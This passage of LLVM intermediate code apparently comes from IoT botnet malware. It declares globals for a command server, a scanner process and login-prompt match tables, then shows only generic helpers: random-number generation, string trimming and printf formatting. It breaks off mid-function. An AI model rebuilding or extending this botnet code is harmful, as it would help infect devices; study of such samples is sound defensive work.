i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0)], align 16
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i32 0, align 4
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@advances = dso_local global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* null], align 16
@fails = dso_local global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.255, i32 0, i32 0), i8* null], align 16
@successes = dso_local global [8 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.261, i32 0, i32 0), i8* null], align 16
@advances2 = dso_local global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* null], align 16
@pids = dso_local global i32* null, align 8
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@scanPid = dso_local global i32 0, align 4
@ourPublicIP = dso_local global %struct.in_addr zeroinitializer, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @init_rand(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %21, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %5, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i64
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 @strcmp(i8* noundef %17, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #11
  %19 = icmp ne i32 %18, 0
  %20 = xor i1 %19, true
  br i1 %20, label %21, label %24

21:                                               ; preds = %10
  %22 = load i32, i32* %4, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %4, align 4
  br label %10, !llvm.loop !8

24:                                               ; preds = %10
  br label %25

25:                                               ; preds = %42, %24
  %26 = load i32, i32* %5, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp sge i32 %26, %27
  br i1 %28, label %29, label %40

29:                                               ; preds = %25
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i64
  %36 = inttoptr i64 %35 to i8*
  %37 = call i32 @strcmp(i8* noundef %36, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i64 0, i64 0)) #11
  %38 = icmp ne i32 %37, 0
  %39 = xor i1 %38, true
  br label %40

40:                                               ; preds = %29, %25
  %41 = phi i1 [ false, %25 ], [ %39, %29 ]
  br i1 %41, label %42, label %45

42:                                               ; preds = %40
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, -1
  store i32 %44, i32* %5, align 4
  br label %25, !llvm.loop !9

45:                                               ; preds = %40
  %46 = load i32, i32* %4, align 4
  store i32 %46, i32* %3, align 4
  br label %47

47:                                               ; preds = %63, %45
  %48 = load i32, i32* %3, align 4
  %49 = load i32, i32* %5, align 4
  %50 = icmp sle i32 %48, %49
  br i1 %50, label %51, label %66

51:                                               ; preds = %47
  %52 = load i8*, i8** %2, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* %4, align 4
  %60 = sub nsw i32 %58, %59
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %57, i64 %61
  store i8 %56, i8* %62, align 1
  br label %63

63:                                               ; preds = %51
  %64 = load i32, i32* %3, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %3, align 4
  br label %47, !llvm.loop !10

66:                                               ; preds = %47
  %67 = load i8*, i8** %2, align 8
  %68 = load i32, i32* %3, align 4
  %69 = load i32, i32* %4, align 4
  %70 = sub nsw i32 %68, %69
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %67, i64 %71
  store i8 0, i8* %72, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @zprintf(i8* noundef %0, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** noundef null, i8* noundef %6, %struct.__va_list_tag* noundef %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @print(i8** noundef %0, i8* noundef %1, %struct.__va_list_tag* noundef %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.492, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** noundef %106, i8* noundef %113, i32 noundef %114, i32 noundef %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** noundef %125, i32 noundef %143, i32 noundef 10, i32 noundef 1, i32 noundef %144, i32 noundef %145, i32 noundef 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** noundef %155, i32 noundef %173, i32 noundef 16, i32 noundef 0, i32 noundef %174, i32 noundef %175, i32 noundef 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** noundef %185, i32 noundef %203, i32 noundef 16, i32 noundef 0, i32 noundef %204, i32 noundef %205, i32 noundef 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** noundef %215, i32 noundef %233, i32 noundef 10, i32 noundef 0, i32 noundef %234, i32 noundef %235, i32 noundef 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
